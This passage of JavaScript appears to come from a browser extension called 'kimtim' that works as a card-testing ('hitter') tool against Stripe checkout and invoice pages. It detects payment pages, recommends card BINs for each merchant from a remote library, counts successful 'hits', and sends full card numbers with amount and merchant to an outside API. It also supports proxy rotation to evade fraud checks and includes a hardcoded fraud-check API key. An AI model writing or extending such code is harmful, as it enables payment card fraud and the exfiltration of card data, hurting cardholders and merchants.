      const emailMatch = pageText.match(/[\w.-]+@[\w.-]+\.\w+/);

      const amountMatch = pageText.match(/[₩$€£¥]\s*[\d,]+\.?\d*/);

      if (emailMatch || amountMatch) {
        invoiceData = {
          amount: amountMatch ? amountMatch[0] : '0',
          currency: '',
          email: emailMatch ? emailMatch[0] : '',
          productName: '',
          businessUrl: '',
          voided: false
        };
      }

    } catch (e) {
    }

    return invoiceData;
  }

  function isInvoiceVoided() {
    const data = extractInvoiceData();
    return data?.voided === true;
  }

  function getInvoiceDisplayName() {
    const data = extractInvoiceData();
    if (!data) return '';
    return data.businessUrl || data.productName || '';
  }

  function getInvoiceAmount() {
    const data = extractInvoiceData();
    if (!data) return '';

    const amount = data.amount;
    const currency = data.currency?.toUpperCase() || '';

    if (typeof amount === 'number') {
      const noDecimalCurrencies = ['KRW', 'JPY', 'VND'];
      if (noDecimalCurrencies.includes(currency)) {
        return `${amount.toLocaleString()} ${currency}`;
      }
      return `${(amount / 100).toFixed(2)} ${currency}`;
    }
    return amount || '0';
  }

  function getInvoiceEmail() {
    const data = extractInvoiceData();
    return data?.email || '';
  }

  function isBuyStripePage() {
    const hostname = window.location.hostname.toLowerCase();
    return hostname === 'buy.stripe.com' || hostname.endsWith('.buy.stripe.com');
  }

  function isPaymentPage() {

    if (isBuyStripePage()) {
      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      if (hasCards && hasSubmit) {
        return true;
      }

      if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"], form[class*="Payment"]')) {
        return true;
      }

      if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]')) {
        return true;
      }
      return false;
    }

    if (isInvoiceStripePage()) {
      if (isInvoiceVoided()) {
        return false;
      }

      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
      if ((hasCards || hasSubmit) && hasInvoiceElements) {
        return true;
      }
      if (window.location.hostname === 'invoice.stripe.com') {
        return true;
      }
    }

    const hasCards = hasCardFields();
    if (!hasCards) return false;

    const hasSubmit = hasSubmitButton();
    if (!hasSubmit) return false;

    const hasSession = hasStripeSessionInUrl();
    if (!hasSession) return false;

    const hasKeys = hasValidStripeKeys();
    if (!hasKeys) return false;

    return true;
  }
  function waitForPaymentPage(callback, maxAttempts = 40) {
    let attempts = 0;
    const check = () => {
      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasSession = hasStripeSessionInUrl();
      const hasKeys = hasValidStripeKeys();

      if (isBuyStripePage()) {
        if (hasCards && hasSubmit) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"]')) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]') && attempts >= 5) {
          callback(true);
          return;
        }
      }

      if (isInvoiceStripePage()) {
        extractInvoiceData();

        if (isInvoiceVoided()) {
          callback(false);
          return;
        }

        const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
        if (hasInvoiceElements || window.location.hostname === 'invoice.stripe.com') {
          if (hasCards && hasSubmit) {
            callback(true);
            
          }
        }
      }

      if (hasCards && hasSubmit && hasSession && hasKeys) {
        callback(true);
      } else if (attempts < maxAttempts) {
        attempts++;
        const delay = attempts < 5 ? 200 : 150;
        setTimeout(check, delay);
      } else {
        callback(false);
      }
    };
    check();
  }

  const LICENSE_KEY = "kimtim-107-4HW3JXIIFEF09RY67WJA";
  const CURRENT_VERSION = "1.0.8";

  let telegramChannelLink = "https://t.me/kimtim"
  let isCreatingOverlay = false
  let licenseChecked = false
  let licenseValid = false
  let latestVersion = ""
  let isVersionOutdated = false

  const pendingRequests = new Map()
  let requestId = 0

  function sendToBackground(message) {
    return new Promise((resolve) => {
      const id = ++requestId
      pendingRequests.set(id, resolve)

      window.postMessage({
        type: "kimtim_TO_BACKGROUND",
        requestId: id,
        payload: message
      }, "*")

      setTimeout(() => {
        if (pendingRequests.has(id)) {
          pendingRequests.delete(id)
          resolve({ success: false, error: "Request timeout" })
        }
      }, 60000)
    })
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "kimtim_FROM_BACKGROUND" && event.data.requestId) {
      const resolve = pendingRequests.get(event.data.requestId)
      if (resolve) {
        pendingRequests.delete(event.data.requestId)
        resolve(event.data.response || { success: false, error: "No response" })
      }
    }
  })

  async function handleAPIRequest(endpoint, payload = {}) {
    return await sendToBackground({ type: "API_REQUEST", endpoint, payload });
  }

  function compareVersions(v1, v2) {
    const parts1 = v1.replace(/^v/, '').split('.').map(Number);
    const parts2 = v2.replace(/^v/, '').split('.').map(Number);

    for (let i = 0; i < Math.max(parts1.length, parts2.length); i++) {
      const p1 = parts1[i] || 0;
      const p2 = parts2[i] || 0;
      if (p1 < p2) return -1;
      if (p1 > p2) return 1;
    }
    return 0;
  }

  async function checkLicenseKey(retryCount = 0) {
    const MAX_RETRIES = 3;

    if (licenseChecked && licenseValid) return licenseValid;

    if (!LICENSE_KEY) {
      licenseValid = false;
      licenseChecked = true;
      return false;
    }

    try {
      const result = await sendToBackground({
        type: "CHECK_LICENSE_KEY",
        key: LICENSE_KEY,
        version: CURRENT_VERSION
      });

      if (!result || result.error) {
        // Retry on error
        if (retryCount < MAX_RETRIES) {
          return checkLicenseKey(retryCount + 1);
        }
        // After max retries, assume valid to not block user
        licenseValid = true;
        licenseChecked = true;
        isVersionOutdated = false;
        return true;
      }

      if (result.valid === true) {
        licenseValid = true;
        licenseChecked = true;
        if (result.telegram_channel) {
          telegramChannelLink = result.telegram_channel;
        }
        if (result.latest_version && typeof result.latest_version === 'string') {
          latestVersion = result.latest_version.trim();
          const comparison = compareVersions(CURRENT_VERSION, latestVersion);
          isVersionOutdated = (comparison === -1);
        } else {
          isVersionOutdated = false;
        }
        isVersionOutdated = false; // Disable update check
        return true;
      } else {
        // Retry if server says invalid (might be temporary issue)
        if (retryCount < MAX_RETRIES) {
          return checkLicenseKey(retryCount + 1);
        }
        licenseValid = false;
        licenseChecked = true;
        if (result.telegram_channel) {
          telegramChannelLink = result.telegram_channel;
        }
        return false;
      }
    } catch (e) {
      // Retry on exception
      if (retryCount < MAX_RETRIES) {
        return checkLicenseKey(retryCount + 1);
      }
      // After max retries, assume valid to not block user
      licenseValid = true;
      licenseChecked = true;
      isVersionOutdated = false;
      return true;
    }
  }

  function showUpdatePage(reason = "outdated") {
    const existingOverlay = document.querySelector(".card-generator-overlay");
    if (existingOverlay) existingOverlay.remove();
    const container = document.createElement("div");
    container.className = "card-generator-overlay";
    container.innerHTML = `
    <div class="panel-header">
      <div class="panel-header-content">
        <span class="panel-title">kimtim</span>
      </div>
    </div>
    <div class="panel-body">
      <div id="updateScreen" class="update-screen">
        <div class="update-icon">🔄</div>
        <h2 class="update-title">Update Required</h2>
        <p class="update-message">
          Your extension version is outdated.
          Please download the latest version to continue using kimtim.
        </p>
        <div class="update-version">
          <span class="current-version">Current: v${CURRENT_VERSION}</span>
        </div>
        <a href="${telegramChannelLink}" target="_blank" class="update-btn">
          📥 Download Update
        </a>
      </div>
    </div>
  `;
    document.body.appendChild(container);
  }

  function showInvalidLicensePage() {
    const existingOverlay = document.querySelector(".card-generator-overlay");
    if (existingOverlay) existingOverlay.remove();
    const container = document.createElement("div");
    container.className = "card-generator-overlay";
    container.innerHTML = `
    <div class="panel-header">
      <div class="panel-header-content">
        <span class="panel-title">kimtim</span>
      </div>
    </div>
    <div class="panel-body">
      <div id="updateScreen" class="update-screen">
        <div class="update-icon">🔄</div>
        <h2 class="update-title">Update Required</h2>
        <p class="update-message">
          Your extension version is outdated.
          Please download the latest version to continue using kimtim.
        </p>
        <div class="update-version">
          <span class="current-version">Current: v${CURRENT_VERSION}</span>
        </div>
        <a href="${telegramChannelLink}" target="_blank" class="update-btn">
          📥 Download Update
        </a>
      </div>
    </div>
  `;
    document.body.appendChild(container);
  }

  const HIT_API_URL = "https://gold-newt-367030.hostingersite.com/api.php"

  let _hitCountsInterval = null;
  const HIT_COUNTS_REFRESH_MS = 30000; // refresh every 30 seconds

  async function fetchHitCounts() {
    try {
      const token = localStorage.getItem(K.TOKEN) || "";
      const payload = { _method: "GET" };
      if (token && token.length === 15) {
        payload.token = token;
      }
      const data = await sendToBackground({
        type: "API_REQUEST",
        endpoint: "hit-counts",
        payload: payload
      });
      if (data && data.success !== false) {
        if (data.global_hits !== undefined) {
          globalHitsCount = data.global_hits;
        }
        if (data.user_hits !== undefined && token) {
          userHitsCount = data.user_hits;
        }
        updateIpBarUserInfo();
      }
    } catch (e) {
      // silently fail, will retry on next interval
    }
  }

  // Backwards-compatible alias so existing calls don't break
  async function fetchGlobalHits() {
    return fetchHitCounts();
  }

  function startHitCountsRefresh() {
    if (_hitCountsInterval) return; // already running
    // First fetch is awaited by caller if needed; start interval for subsequent refreshes
    fetchHitCounts();
    _hitCountsInterval = setInterval(fetchHitCounts, HIT_COUNTS_REFRESH_MS);
  }

  function stopHitCountsRefresh() {
    if (_hitCountsInterval) {
      clearInterval(_hitCountsInterval);
      _hitCountsInterval = null;
    }
  }

  let hasNotified = false
  let hasHit = false
  let isMinimized = false
  let isAutoSubmitting = false
  let attemptCount = 0
  let retryDelay = Math.floor(Math.random() * 500) + 500
  let cardHistory = []

  async function recordHit(token, hitData) {
    try {
      if (!token) {
        return
      }
      if (!hitData.fullCard || hitData.fullCard.length < 10) {
        return
      }

      // Route through background script to avoid CSP violation
      const response = await sendToBackground({
        type: "API_REQUEST",
        endpoint: "hit",
        payload: {
          token: token,
          full_card: hitData.fullCard,
          amount: hitData.amount || '0',
          currency: hitData.currency || 'usd',
          merchant: hitData.merchant || 'N/A'
        }
      })
      if (response && response.hits) {
        userHitsCount = response.user_hits || response.hits;
        if (response.global_hits !== undefined) {
          globalHitsCount = response.global_hits;
        }
        updateIpBarUserInfo();
        // Also refresh from hit_counts.json as a fallback
        fetchHitCounts();
      }
    } catch (e) {
    }
  }

  function loadCardHistory() {
    return new Promise((resolve) => {
      // Use proper storageRequest path via storage module
      if (window.kimtimStorage && window.kimtimStorage.loadAllData) {
        window.kimtimStorage.loadAllData(function (data) {
          data = data || {};
          let logs = data[K.LOGS] || [];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
          let clearedAt = data[K.LOGS_CLEARED_AT] || null;
          if (clearedAt) {
            const clearedTime = new Date(clearedAt).getTime();
            logs = logs.filter(function (l) { return new Date(l.time || l.timestamp).getTime() > clearedTime; });
          }
          if (Array.isArray(logs)) {
            cardHistory = logs;
            localStorage.setItem(K.LOGS, JSON.stringify(logs));
          }
          if (clearedAt) localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt);
          resolve();
        });
        setTimeout(resolve, 3000); // Timeout fallback
        return;
      }

      // Legacy fallback path (should not be reached)
      let gotLogs = false;
      let gotClearedAt = false;
      let logs = [];
      let clearedAt = null;

      const handler = (event) => {
        if (event.data && event.data.type === 'kimtim_STORAGE_RESPONSE') {
          if (event.data.key === K.LOGS) {
            logs = event.data.value || [];
            if (typeof logs === 'string') {
              try { logs = JSON.parse(logs); } catch (e) { logs = []; }
            }
            gotLogs = true;
          }
          if (event.data.key === K.LOGS_CLEARED_AT) {
            clearedAt = event.data.value;
            gotClearedAt = true;
          }

          if (gotLogs && gotClearedAt) {
            window.removeEventListener('message', handler);
            if (clearedAt) {
              cardHistory = logs.filter(log => log.time && log.time > clearedAt);
            } else {
              cardHistory = logs;
            }
            resolve(cardHistory);
          }
        }
      };

      window.addEventListener('message', handler);

      setTimeout(() => {
        if (!gotLogs) {
          window.removeEventListener('message', handler);
          const localLogs = JSON.parse(localStorage.getItem(K.LOGS) || "[]");
          const localClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT);
          cardHistory = localClearedAt ? localLogs.filter(log => log.time && log.time > localClearedAt) : localLogs;
          resolve(cardHistory);
        }
      }, 1000);
    });
  }

  function saveCardHistory() {
    const logsToSave = cardHistory.slice(0, 50);
    const data = {};
    data[K.LOGS] = logsToSave;
    window.postMessage({
      type: 'kimtim_STORAGE_REQUEST',
      requestId: 'logs_' + Date.now(),
      action: 'SET',
      data: data
    }, '*');
    localStorage.setItem(K.LOGS, JSON.stringify(logsToSave));
  }

  loadCardHistory().then(() => {
    if (typeof updateHistoryDisplay === 'function') {
      updateHistoryDisplay();
    }
  });

  let currentMode = "bin"
  let ccList = []
  let currentCCIndex = 0
  let isLoggedIn = false
  let userId = ""
  let userFirstName = ""
  let userPfpUrl = ""
  let userHitsCount = 0
  let userAttemptsCount = 0
  let globalHitsCount = 0
  const DEFAULT_PFP = (() => {
    try {
      const injectedScript = document.querySelector('script[data-luis-hitter="true"]');
      if (injectedScript) {
        const iconUrl = injectedScript.getAttribute('data-icon-url');
        if (iconUrl) return iconUrl;
      }
      const meta = document.querySelector('meta[name="kimtim-default-pfp"]');
      if (meta && meta.content) return meta.content;
    } catch (e) { }
    return "icons/icon128.png";
  })()
  let tgForwardEnabled = true
  let cardFieldsDetected = false
  const notiSoundEnabled = true
  let soundVolume = 1.0
  let customName = ""
  let customEmail = ""
  let globalStorageLoaded = false

  let proxyEnabled = false;
  let proxyString = "";
  let proxyInfo = { ip: "", response_time_ms: 0, country_name: "", country_code: "", ip_type: "" };
  let proxyList = [];
  let proxyAutoRotate = false;
  const IP_FRAUD_API_KEY = 'kimtim_ipqs_api_key';
  const DEFAULT_IPQS_API_KEY = 'BwKEXCuVWkRCetqRfHJYwvNFTnfcebRm';
  let ipFraudApiKey = localStorage.getItem(IP_FRAUD_API_KEY) || DEFAULT_IPQS_API_KEY;

  function syncProxyFromModule() {
    if (window.kimtimProxy) {
      proxyEnabled = window.kimtimProxy.enabled;
      proxyString = window.kimtimProxy.string;
      proxyInfo = window.kimtimProxy.info;
      proxyList = window.kimtimProxy.list || [];
      proxyAutoRotate = !!window.kimtimProxy.autoRotate;
    }
  }

  function syncProxyToModule() {
    if (window.kimtimProxy) {
      window.kimtimProxy.enabled = proxyEnabled;
      window.kimtimProxy.string = proxyString;
      window.kimtimProxy.info = proxyInfo;
      window.kimtimProxy.list = proxyList;
      window.kimtimProxy.autoRotate = proxyAutoRotate;
    }
  }

  function checkProxyLive(proxyStr) {
    return window.kimtimProxy ? window.kimtimProxy.checkProxyLive(proxyStr) : Promise.resolve({ success: false, error: "Module not loaded" });
  }

  function parseProxyFormat(proxyStr) {
    return window.kimtimProxy ? window.kimtimProxy.parseProxyFormat(proxyStr) : null;
  }

  function normalizeProxyString(proxyStr) {
    return window.kimtimProxy ? window.kimtimProxy.normalizeProxyString(proxyStr) : null;
  }

  function obfuscateProxy(proxyStr) {
    return window.kimtimProxy ? window.kimtimProxy.obfuscateProxy(proxyStr) : "Not set";
  }

  function loadProxySettings() {
    if (window.kimtimProxy) {
      window.kimtimProxy.loadProxySettings();
      syncProxyFromModule();
    }
  }

  function saveProxySettings() {
    syncProxyToModule();
    if (window.kimtimProxy) {
      window.kimtimProxy.saveProxySettings();
    }
  }

  function clearSavedProxy(reason) {
    if (window.kimtimProxy) {
      window.kimtimProxy.clearSavedProxy(reason, showWarning, updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }

  function clearSavedProxyQuiet(reason) {
    if (window.kimtimProxy) {
      window.kimtimProxy.clearSavedProxyQuiet(reason, updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }

  async function autoLoadAndVerifyProxy() {
    if (window.kimtimProxy) {
      await window.kimtimProxy.autoLoadAndVerifyProxy(updateBottomIpBar, fetchRealIp);
      syncProxyFromModule();
    }
  }

  let binLibrary = [];

  async function fetchBinLibrary() {
    if (window.kimtimBinLibrary) {
      const result = await window.kimtimBinLibrary.fetchBinLibrary();

      binLibrary = window.kimtimBinLibrary.bins || [];
      return result;
    }
    return false;
  }

  function renderBinLibraryGrid() {
    if (window.kimtimBinLibrary) {

      binLibrary = window.kimtimBinLibrary.bins || [];

      const restoreDashboard = () => {
        const overlay = document.querySelector(".card-generator-overlay");
        if (overlay && isMinimized) {
          isMinimized = false;
          overlay.classList.remove("minimized");
          const minimizeBtn = document.getElementById("minimizeBtn");
          if (minimizeBtn) {
            minimizeBtn.innerHTML = "»";
            minimizeBtn.title = "Close panel";
          }
        }
      };
      window.kimtimBinLibrary.renderBinLibraryGrid(showWarning, restoreDashboard);
    }
  }

  let binRecommendationShown = false;

  function checkBinRecommendation(businessUrl) {
    if (!businessUrl || binRecommendationShown || !binLibrary || binLibrary.length === 0) return;

    const cleanUrl = (url) => {
      if (!url) return '';
      return url.toLowerCase()
        .replace(/^https?:\/\//, '')
        .replace(/^www\./, '')
        .replace(/\/$/, '')
        .split('/')[0];
    };

    const targetDomain = cleanUrl(businessUrl);
    if (!targetDomain) return;

    const matchingBins = binLibrary.filter(bin => {
      const binSite = cleanUrl(bin.site);
      return binSite === targetDomain ||
        binSite.includes(targetDomain) ||
        targetDomain.includes(binSite);
    });

    if (matchingBins.length > 0) {
      binRecommendationShown = true;
      showBinRecommendationPopup(businessUrl, matchingBins);
    }
  }

  function showBinRecommendationPopup(site, bins) {
    const existingPopup = document.getElementById('kimtim-bin-recommend');
    if (existingPopup) existingPopup.remove();

    const popup = document.createElement('div');
    popup.id = 'kimtim-bin-recommend';
    popup.className = 'bin-recommend-popup';

    const cleanSite = site.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/$/, '');

    let binsHtml = '';
    bins.forEach((bin, index) => {
      const binNumber = bin.bin || bin.BIN || '';
      const binCredit = bin.credit || 'N/A';
      binsHtml += `
        <div class="bin-recommend-item">
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Site:</span>
            <span class="bin-recommend-value">${cleanSite}</span>
          </div>
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Bin:</span>
            <span class="bin-recommend-value bin-number">${binNumber}</span>
            <button class="bin-recommend-copy-btn" data-bin="${binNumber}">Copy</button>
          </div>
          <div class="bin-recommend-row">
            <span class="bin-recommend-label">Credit:</span>
            <span class="bin-recommend-value">${binCredit}</span>
          </div>
        </div>
      `;
    });

    popup.innerHTML = `
      <div class="bin-recommend-header">
        <span>Bin Found</span>
        <div class="bin-recommend-countdown" id="binRecommendCountdown">10s</div>
      </div>
      <div class="bin-recommend-body">
        ${binsHtml}
      </div>
    `;

    document.body.appendChild(popup);

    popup.style.setProperty('background', 'rgba(255,255,255,0.78)', 'important');
    popup.style.setProperty('background-color', 'rgba(255,255,255,0.78)', 'important');
    popup.style.setProperty('background-image', 'none', 'important');
    popup.style.setProperty('backdrop-filter', 'blur(8px)', 'important');
    popup.style.setProperty('-webkit-backdrop-filter', 'blur(8px)', 'important');
    popup.style.setProperty('border', '1px solid rgba(255,255,255,0.45)', 'important');
    popup.style.setProperty('box-shadow', '0 8px 32px rgba(13,148,136,0.12), inset 0 1px 0 rgba(255,255,255,0.6)', 'important');

    const header = popup.querySelector('.bin-recommend-header');
    if (header) {
      header.style.setProperty('background', 'linear-gradient(135deg, rgba(13,148,136,0.85), rgba(15,118,110,0.9))', 'important');
      header.style.setProperty('border-bottom', '1px solid rgba(255,255,255,0.15)', 'important');
    }

    const body = popup.querySelector('.bin-recommend-body');
    if (body) {
      body.style.setProperty('background', 'rgba(248,253,252,0.5)', 'important');
      body.style.setProperty('background-color', 'rgba(248,253,252,0.5)', 'important');
    }

    setTimeout(() => popup.classList.add('show'), 50);

    let countdown = 10;
    const countdownEl = document.getElementById('binRecommendCountdown');
    const countdownInterval = setInterval(() => {
      countdown--;
      if (countdownEl) {
        countdownEl.textContent = countdown + 's';
      }
      if (countdown <= 0) {
        clearInterval(countdownInterval);
        popup.classList.remove('show');
        setTimeout(() => popup.remove(), 300);
      }
    }, 1000);

    const copyBtns = popup.querySelectorAll('.bin-recommend-copy-btn');
    copyBtns.forEach(btn => {
      btn.addEventListener('click', async (e) => {
        const binToCopy = btn.getAttribute('data-bin');
        try {
          await navigator.clipboard.writeText(binToCopy);
          btn.textContent = 'Copied!';
          showWarning(`BIN ${binToCopy} copied!`, 'success');
          setTimeout(() => btn.textContent = 'Copy', 2000);
        } catch (err) {
          const textarea = document.createElement('textarea');
          textarea.value = binToCopy;
          textarea.style.position = 'fixed';
          textarea.style.opacity = '0';
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          btn.textContent = 'Copied!';
          showWarning(`BIN ${binToCopy} copied!`, 'success');
          setTimeout(() => btn.textContent = 'Copy', 2000);
        }
      });
    });
  }

  async function checkNewBinNotification() {
    try {
      const userId = localStorage.getItem(K.USER_ID);
      if (!userId) return false;

      const lastSeenBinTime = localStorage.getItem(K.LAST_SEEN_BIN_TIME);

      let bins = binLibrary || [];
      if (bins.length === 0 && window.kimtimBinLibrary) {
        bins = window.kimtimBinLibrary.bins || [];
      }
      if (bins.length === 0) return false;

      if (!lastSeenBinTime) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, new Date().toISOString());
        return false;
      }

      const lastSeenDate = new Date(lastSeenBinTime);

      const newBins = bins.filter(bin => {
        if (!bin.added_at) return false;
        const binDate = new Date(bin.added_at);
        return binDate > lastSeenDate;
      });

      if (newBins.length > 0) {
        await showNewBinNotification(newBins.length);
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, new Date().toISOString());
        return true;
      }
      return false;
    } catch (e) {
      return false;
    }
  }

  function showNewBinNotification(count) {
    return new Promise((resolve) => {

      const existing = document.getElementById('kimtim-bin-notification');
      if (existing) existing.remove();

      const notification = document.createElement('div');
      notification.id = 'kimtim-bin-notification';
      notification.className = 'bin-notification';

      const siteText = count === 1 ? 'Site' : 'Sites';

      notification.innerHTML = `
        <div class="bin-notification-header">
          <span class="bin-notification-icon">📚</span>
          <span class="bin-notification-title">Library Updated</span>
        </div>
        <div class="bin-notification-body">
          <span class="bin-notification-count">${count}</span> New ${siteText} Added
        </div>
      `;

      notification.style.setProperty('background', 'rgba(255,255,255,0.78)', 'important');
      notification.style.setProperty('background-color', 'rgba(255,255,255,0.78)', 'important');
      notification.style.setProperty('background-image', 'none', 'important');
      notification.style.setProperty('backdrop-filter', 'blur(8px)', 'important');
      notification.style.setProperty('-webkit-backdrop-filter', 'blur(8px)', 'important');
      notification.style.setProperty('border', '1px solid rgba(255,255,255,0.45)', 'important');
      notification.style.setProperty('box-shadow', '0 8px 32px rgba(13,148,136,0.12), inset 0 1px 0 rgba(255,255,255,0.6)', 'important');

      const header = notification.querySelector('.bin-notification-header');
      if (header) {
        header.style.setProperty('background', 'linear-gradient(135deg, rgba(13,148,136,0.85), rgba(15,118,110,0.9))', 'important');
        header.style.setProperty('border-bottom', '1px solid rgba(255,255,255,0.15)', 'important');
      }

      const body = notification.querySelector('.bin-notification-body');
      if (body) {
        body.style.setProperty('background', 'rgba(248,253,252,0.5)', 'important');
        body.style.setProperty('background-color', 'rgba(248,253,252,0.5)', 'important');
      }

      document.body.appendChild(notification);

      setTimeout(() => notification.classList.add('show'), 50);

      setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
          notification.remove();
          resolve();
        }, 300);
      }, 5000);
    });
  }

  syncProxyFromModule();

  function initGlobalStorage() {
    return new Promise((resolve) => {
      if (!window.kimtimStorage || !window.kimtimStorage.loadAllData) {
        globalStorageLoaded = true;
        resolve();
        return;
      }

      window.kimtimStorage.loadAllData(function (data) {
        data = data || {};

        // Sync BINs
        if (data[K.SAVED_BINS]) {
          let bins = data[K.SAVED_BINS];
          if (typeof bins === 'string') try { bins = JSON.parse(bins); } catch (e) { bins = []; }
          if (Array.isArray(bins) && bins.length > 0) {
            savedBINs = [...new Set(bins)];
            localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          }
        }

        // Sync background color
        if (data[K.BG_COLOR]) {
          pageBackgroundColor = data[K.BG_COLOR];
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.BG_COLOR]);
        }
        if (data[K.PAGE_HAS_CUSTOM] !== undefined) {
          userHasSetCustomColor = data[K.PAGE_HAS_CUSTOM] === true || data[K.PAGE_HAS_CUSTOM] === 'true';
        }

        // Sync logs
        if (data[K.LOGS]) {
          let logs = data[K.LOGS];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
          if (Array.isArray(logs)) localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
        if (data[K.LOGS_CLEARED_AT]) {
          localStorage.setItem(K.LOGS_CLEARED_AT, data[K.LOGS_CLEARED_AT]);
        }

        // Sync custom name/email
        if (data[K.CUSTOM_NAME]) {
          customName = data[K.CUSTOM_NAME];
          localStorage.setItem(K.CUSTOM_NAME, data[K.CUSTOM_NAME]);
        }
        if (data[K.CUSTOM_EMAIL]) {
          customEmail = data[K.CUSTOM_EMAIL];
          localStorage.setItem(K.CUSTOM_EMAIL, data[K.CUSTOM_EMAIL]);
        }

        // Sync user session to localStorage (cross-origin availability)
        if (data[K.TOKEN]) {
          localStorage.setItem(K.TOKEN, data[K.TOKEN]);
        }
        if (data[K.USER_ID]) {
          userId = data[K.USER_ID];
          localStorage.setItem(K.USER_ID, data[K.USER_ID]);
        }
        if (data[K.FIRST_NAME]) {
          userFirstName = data[K.FIRST_NAME];
          localStorage.setItem(K.FIRST_NAME, data[K.FIRST_NAME]);
        }

        // Sync saved ID
        if (data[K.SAVED_ID]) {
          savedId = data[K.SAVED_ID];
          localStorage.setItem(K.SAVED_ID, data[K.SAVED_ID]);
        }

        // Sync HAS_CUSTOM_COLOR
        if (data[K.HAS_CUSTOM_COLOR] !== undefined) {
          localStorage.setItem(K.HAS_CUSTOM_COLOR, data[K.HAS_CUSTOM_COLOR]);
        }

        // Sync BG_ENABLED
        if (data[K.BG_ENABLED] !== undefined) {
          localStorage.setItem(K.BG_ENABLED, data[K.BG_ENABLED]);
        }

        // Sync PAGE_BG_COLOR
        if (data[K.PAGE_BG_COLOR]) {
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.PAGE_BG_COLOR]);
        }

        // Sync toggles
        if (data[K.TOGGLE_TG_FORWARD] !== undefined) {
          tgForwardEnabled = data[K.TOGGLE_TG_FORWARD] !== false && data[K.TOGGLE_TG_FORWARD] !== 'false';
          localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
        }
        if (data[K.TOGGLE_HIT_SOUND] !== undefined) {
          localStorage.setItem(K.TOGGLE_HIT_SOUND, data[K.TOGGLE_HIT_SOUND]);
        }
        if (data[K.TOGGLE_AUTO_SS] !== undefined) {
          localStorage.setItem(K.TOGGLE_AUTO_SS, data[K.TOGGLE_AUTO_SS]);
        }

        // Sync proxy settings
        if (data[K.PROXY_ENABLED] !== undefined) {
          localStorage.setItem(K.PROXY_ENABLED, data[K.PROXY_ENABLED]);
        }
        if (data[K.PROXY_STRING]) {
          localStorage.setItem(K.PROXY_STRING, data[K.PROXY_STRING]);
        }
        if (data[K.PROXY_INFO]) {
          localStorage.setItem(K.PROXY_INFO, typeof data[K.PROXY_INFO] === 'object' ? JSON.stringify(data[K.PROXY_INFO]) : data[K.PROXY_INFO]);
        }

        // Sync music (name only -- MUSIC_DATA stays in chrome.storage, too large for localStorage)
        if (data[K.MUSIC_NAME]) {
          localStorage.setItem(K.MUSIC_NAME, data[K.MUSIC_NAME]);
        }

        // Sync card history
        if (data[K.CARD_HISTORY]) {
          let hist = data[K.CARD_HISTORY];
          if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch (e) { hist = []; }
          if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
        }

        // Sync last seen BIN time
        if (data[K.LAST_SEEN_BIN_TIME]) {
          localStorage.setItem(K.LAST_SEEN_BIN_TIME, data[K.LAST_SEEN_BIN_TIME]);
        }

        globalStorageLoaded = true;
        resolve();
      });

      // Timeout fallback
      setTimeout(() => {
        if (!globalStorageLoaded) {
          globalStorageLoaded = true;
          resolve();
        }
      }, 3000);
    });
  }

  function saveToGlobalStorage(key, value) {
    const data = {};
    data[key] = value;
    // Use the proper storageRequest path via storage module
    window.postMessage({ type: 'kimtim_STORAGE_REQUEST', requestId: 'save_' + Date.now(), action: 'SET', data: data }, '*');
    localStorage.setItem(key, typeof value === 'object' ? JSON.stringify(value) : value);
  }

  initGlobalStorage();

  function loadCustomNameEmail() {
    return new Promise((resolve) => {
      if (window.kimtimStorage && window.kimtimStorage.loadAllData) {
        window.kimtimStorage.loadAllData(function (data) {
          data = data || {};
          customName = data[K.CUSTOM_NAME] || localStorage.getItem(K.CUSTOM_NAME) || "";
          customEmail = data[K.CUSTOM_EMAIL] || localStorage.getItem(K.CUSTOM_EMAIL) || "";
          resolve({ name: customName, email: customEmail });
        });
        setTimeout(() => resolve({ name: customName, email: customEmail }), 2000);
      } else {
        customName = localStorage.getItem(K.CUSTOM_NAME) || "";
        customEmail = localStorage.getItem(K.CUSTOM_EMAIL) || "";
        resolve({ name: customName, email: customEmail });
      }
    });
  }

  function saveCustomName(name) {
    customName = name;
    localStorage.setItem(K.CUSTOM_NAME, name);
    if (window.kimtimStorage && window.kimtimStorage.saveCustomName) {
      window.kimtimStorage.saveCustomName(name);
    }
  }

  function saveCustomEmail(email) {
    customEmail = email;
    localStorage.setItem(K.CUSTOM_EMAIL, email);
    if (window.kimtimStorage && window.kimtimStorage.saveCustomEmail) {
      window.kimtimStorage.saveCustomEmail(email);
    }
  }

  loadCustomNameEmail().then(({ name, email }) => {
    const nameInput = document.getElementById('customNameInput');
    const emailInput = document.getElementById('customEmailInput');
    if (nameInput) nameInput.value = name;
    if (emailInput) emailInput.value = email;
  });
